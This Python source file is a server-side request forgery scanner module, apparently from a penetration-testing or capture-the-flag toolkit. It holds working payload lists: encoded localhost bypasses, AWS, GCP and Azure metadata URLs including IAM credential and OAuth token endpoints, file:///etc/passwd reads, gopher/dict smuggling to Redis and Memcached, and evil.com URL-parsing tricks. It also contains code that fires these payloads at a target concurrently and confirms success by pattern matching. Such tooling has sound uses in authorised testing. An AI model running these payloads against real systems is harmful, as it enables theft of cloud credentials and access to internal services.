"""SSRF (Server-Side Request Forgery) scanner module."""

import asyncio
import re
from typing import Optional, Callable

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Localhost bypass payloads
LOCALHOST_BYPASS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.1",
    "http://0.0.0.0",
    "http://0",
    "http://[::1]",
    "http://[0:0:0:0:0:0:0:1]",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://2130706433",  # 127.0.0.1 as decimal
    "http://0x7f000001",  # 127.0.0.1 as hex
    "http://0177.0.0.1",  # 127.0.0.1 as octal
]

# Cloud metadata endpoints
AWS_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
]

GCP_METADATA = [
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://169.254.169.254/computeMetadata/v1/",
]

AZURE_METADATA = [
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
]

# Internal service ports
INTERNAL_SERVICES = [
    ("http://localhost:6379", "Redis"),
    ("http://localhost:11211", "Memcached"),
    ("http://localhost:3306", "MySQL"),
    ("http://localhost:5432", "PostgreSQL"),
    ("http://localhost:27017", "MongoDB"),
    ("http://localhost:9200", "Elasticsearch"),
    ("http://localhost:8080", "HTTP-alt"),
    ("http://localhost:22", "SSH"),
]

# Protocol payloads
PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "Local file read"),
    ("file:///etc/hosts", "Hosts file"),
    ("file:///c:/windows/win.ini", "Windows config"),
    ("dict://localhost:11211/info", "Memcached dict"),
    ("gopher://localhost:6379/_INFO", "Redis gopher"),
]

# Patterns indicating SSRF success
SSRF_SUCCESS_PATTERNS = [
    r'root:x:0:0',  # /etc/passwd
    r'localhost',
    r'127\.0\.0\.1',
    r'ami-id',  # AWS metadata
    r'instance-id',
    r'security-credentials',
    r'computeMetadata',  # GCP
    r'"compute"',  # Azure
    r'Redis',  # Redis response
    r'STAT',  # Memcached response
    r'\[mysqld\]',  # MySQL config
    r'\[fonts\]',  # win.ini
]


class SsrfScanner(AttackModule):
    """SSRF vulnerability scanner."""

    @property
    def name(self) -> str:
        return "SSRF Scanner"

    @property
    def description(self) -> str:
        return "Scans for Server-Side Request Forgery vulnerabilities"

    def __init__(self, ctx: AttackContext, cloud_provider: str = "auto"):
        """
        Initialize SSRF scanner.

        Args:
            ctx: Attack context
            cloud_provider: Cloud provider (aws, gcp, azure, auto)
        """
        super().__init__(ctx)
        self.cloud_provider = cloud_provider
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []
        self.accessible_endpoints: list[str] = []

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        scan_cloud: bool = True,
        scan_internal: bool = True
    ) -> list[dict]:
        """
        Scan target for SSRF vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found
            scan_cloud: Scan for cloud metadata access
            scan_internal: Scan for internal service access

        Returns:
            List of findings
        """
        if payloads is None:
            payloads = self._get_default_payloads(scan_cloud, scan_internal)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} SSRF payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for SSRF...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"]
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        scan_cloud: bool = True,
        scan_internal: bool = True
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads(scan_cloud, scan_internal)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} SSRF payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for SSRF...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single SSRF payload asynchronously."""
        try:
            response = await self.client.request_with_payload(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check for SSRF indicators
            is_vulnerable, evidence, ssrf_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"SSRF ({ssrf_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(ssrf_type, evidence),
                    "ssrf_type": ssrf_type,
                    "flags_found": flags,
                    "response_length": response.content_length,
                    "accessible_endpoint": payload,
                }
                self.vulnerable_payloads.append(finding)
                self.accessible_endpoints.append(payload)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing SSRF payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response = self.client.request_with_payload_sync(payload)

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, ssrf_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"SSRF ({ssrf_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(ssrf_type, evidence),
                    "ssrf_type": ssrf_type,
                    "flags_found": flags,
                    "accessible_endpoint": payload,
                }
                self.vulnerable_payloads.append(finding)
                self.accessible_endpoints.append(payload)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing SSRF payload: {e}")

        return None

    def _check_vulnerability(
        self, response: Response, payload: str
    ) -> tuple[bool, str, str]:
        """Check if SSRF was successful."""
        text = response.text

        # Check for content differences from baseline
        if self.analyzer and response.content_length != self.analyzer.baseline.content_length:
            # Significant size difference might indicate different content
            size_diff = abs(response.content_length - self.analyzer.baseline.content_length)
            if size_diff > 100:
                # Check for specific patterns
                for pattern in SSRF_SUCCESS_PATTERNS:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        ssrf_type = self._classify_ssrf_type(payload)
                        return True, f"Pattern found: {match.group()[:50]}", ssrf_type

        # Check for cloud metadata patterns
        if "169.254.169.254" in payload or "metadata" in payload.lower():
            if any(p in text for p in ["ami-id", "instance-id", "security-credentials"]):
                return True, "AWS metadata accessible", "cloud_metadata"
            if "computeMetadata" in text:
                return True, "GCP metadata accessible", "cloud_metadata"
            if '"compute"' in text or '"network"' in text:
                return True, "Azure metadata accessible", "cloud_metadata"

        # Check for file read patterns
        if payload.startswith("file://"):
            if "root:x:0:0" in text or "[fonts]" in text:
                return True, "Local file read successful", "file_read"

        # Check for internal service patterns
        if "localhost" in payload or "127.0.0.1" in payload:
            if any(p in text.lower() for p in ["redis", "memcached", "mysql", "mongodb"]):
                return True, "Internal service accessible", "internal_service"

        return False, "", ""

    def _classify_ssrf_type(self, payload: str) -> str:
        """Classify the type of SSRF based on payload."""
        if "169.254.169.254" in payload or "metadata" in payload.lower():
            return "cloud_metadata"
        if payload.startswith("file://"):
            return "file_read"
        if any(p in payload for p in ["dict://", "gopher://", "ftp://"]):
            return "protocol_smuggling"
        if "localhost" in payload or "127.0.0.1" in payload:
            return "localhost_access"
        return "unknown"

    def _calculate_confidence(self, ssrf_type: str, evidence: str) -> str:
        """Calculate confidence level."""
        if ssrf_type in ["cloud_metadata", "file_read"]:
            return "high"
        if ssrf_type in ["internal_service", "localhost_access"]:
            return "medium"
        return "low"

    def _get_default_payloads(self, scan_cloud: bool, scan_internal: bool) -> list[str]:
        """Get default SSRF payloads."""
        payloads = LOCALHOST_BYPASS.copy()

        # Add cloud metadata payloads
        if scan_cloud:
            if self.cloud_provider in ["auto", "aws"]:
                payloads.extend(AWS_METADATA)
            if self.cloud_provider in ["auto", "gcp"]:
                payloads.extend(GCP_METADATA)
            if self.cloud_provider in ["auto", "azure"]:
                payloads.extend(AZURE_METADATA)

        # Add internal service payloads
        if scan_internal:
            payloads.extend([url for url, _ in INTERNAL_SERVICES])

        # Add protocol payloads
        payloads.extend([url for url, _ in PROTOCOL_PAYLOADS])

        return list(set(payloads))

    def get_bypass_payloads(self, target_ip: str = "127.0.0.1") -> list[str]:
        """Generate bypass payloads for a specific IP."""
        # Convert IP to different formats
        parts = target_ip.split(".")
        if len(parts) == 4:
            decimal = sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts))
            hex_ip = hex(decimal)
            octal_parts = [oct(int(p)) for p in parts]

            return [
                f"http://{target_ip}",
                f"http://{decimal}",
                f"http://{hex_ip}",
                f"http://{'.'.join(octal_parts)}",
                f"http://{target_ip}.nip.io",
                f"http://{target_ip}%23@evil.com",
                f"http://evil.com@{target_ip}",
            ]
        return [f"http://{target_ip}"]
